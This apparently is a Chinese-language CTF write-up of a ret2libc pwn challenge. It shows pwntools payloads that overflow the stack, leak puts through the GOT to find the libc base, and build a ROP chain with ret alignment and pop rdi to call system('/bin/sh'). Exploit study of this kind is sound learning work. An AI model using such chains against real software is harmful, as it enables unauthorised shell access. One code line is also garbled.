+++
title = "ret2libc  25.12.11"
date = "2026-03-25"
type = "post"
categories = ['BUU']
tags = ['BUU']
draft = false
+++
看到文件开启了NX保护 
![Pasted image 20251211183639.png](ret2libc25.12.11%E9%99%84%E4%BB%B6/Pasted%20image%2020251211183639.png)
有一个fgets函数
去看看有没有什么能用的
![Pasted image 20251211184514.png](ret2libc25.12.11%E9%99%84%E4%BB%B6/Pasted%20image%2020251211184514.png)
没有/bin/sh
ida里面找了找也没有system
题目给了libc.so文件，属于第三类的ret2libc
再看看libc.so文件

![Pasted image 20251211192107.png](ret2libc25.12.11%E9%99%84%E4%BB%B6/Pasted%20image%2020251211192107.png)
这个是system的地址，这个和ida找到的不一样，先用这个试试
![Pasted image 20251211185443.png](ret2libc25.12.11%E9%99%84%E4%BB%B6/Pasted%20image%2020251211185443.png)
这个是libc_start_main 的地址，不知道有没有用先搞下来
![Pasted image 20251211185622.png](ret2libc25.12.11%E9%99%84%E4%BB%B6/Pasted%20image%2020251211185622.png)
![Pasted image 20251211191117.png](ret2libc25.12.11%E9%99%84%E4%BB%B6/Pasted%20image%2020251211191117.png)
这里又有了/bin/sh
现在有些问题是没有学pwntool咋用，好消息是好像什么都给了


payload构造:
我们要做的只是把binsh传进system里
那么先溢出，再传system，/bin/sh然而不行
libc会有栈对齐的要求,要ret
改为先溢出，再ret，再pop一个rdi，再binsh，再system
或者先溢出，再binsh ，再ret，再system
```python
payload = b'a'*0x20 + p64(0xdeadbeef) + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system)
```
  现在有一些问题
    为什么是先binsh再system
    为什么pop的是rdi函数调用寄存器规则
再看之前写的，system和binsh是在glibc库里的，在程序运行前是没有具体地址的。
在想要调用的函数没有被调用过，想要调用他的时候，是按照这个过程来调用的
xxx@plt -> xxx@got -> xxx@plt -> 公共 @plt -> _dl_runtime_resolve 
可以参考_dl_runtime_resolve如何找到函数
也就是说我们需要
1. 找到偏移量（也就是找到libc版本）
2. 找到运行后的实际地址
3. 接收泄露地址
4. 栈对齐
5. 两次运行
6. 确保pop_gadget地址正确
找libc库的话wiki中有给到方法libcsearcher
第一次的payload通过泄露一个函数的地址来确定libc基地址
第二次的payload实行system(/bin/sh)
第一次
payload=b'a'*0x20+b'b'*8+p64(pop_rdi)+p64(elf.got['puts'])+p64(elf.sym['puts'])+p64(elf.sym['main']
函数的调用elf.sym和获得got表中的地址elf.got可以看这个
return2libc
拿到pop_rdi地址和ret地址
![Pasted image 20251212172824.png](ret2libc25.12.11%E9%99%84%E4%BB%B6/Pasted%20image%2020251212172824.png)
pop_rdi = 0x400753  
ret = 0x40050e
偏移值  
binsh   0x1b45bd
![Pasted image 20251215091148.png](ret2libc25.12.11%E9%99%84%E4%BB%B6/Pasted%20image%2020251215091148.png)
system    0x52290
       ![Pasted image 20251215090800.png](ret2libc25.12.11%E9%99%84%E4%BB%B6/Pasted%20image%2020251215090800.png)

计算libc基地址：
got=u64(data.ljust(8,b'\0'))(ru(b'\x7f')[-6:])
base=got-libc.sym['puts']
print(hex(base))
system=base+0x52290
binsh=base+0x1b45bd

题目返回的是![Pasted image 20251215091635.png](ret2libc25.12.11%E9%99%84%E4%BB%B6/Pasted%20image%2020251215091635.png)
所以要有r.sendlineafter('Glad to meet you again!What u bring to me this time?\n',payload)

第二次payload
payload=b'a'*0x20+b'b'*8+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)
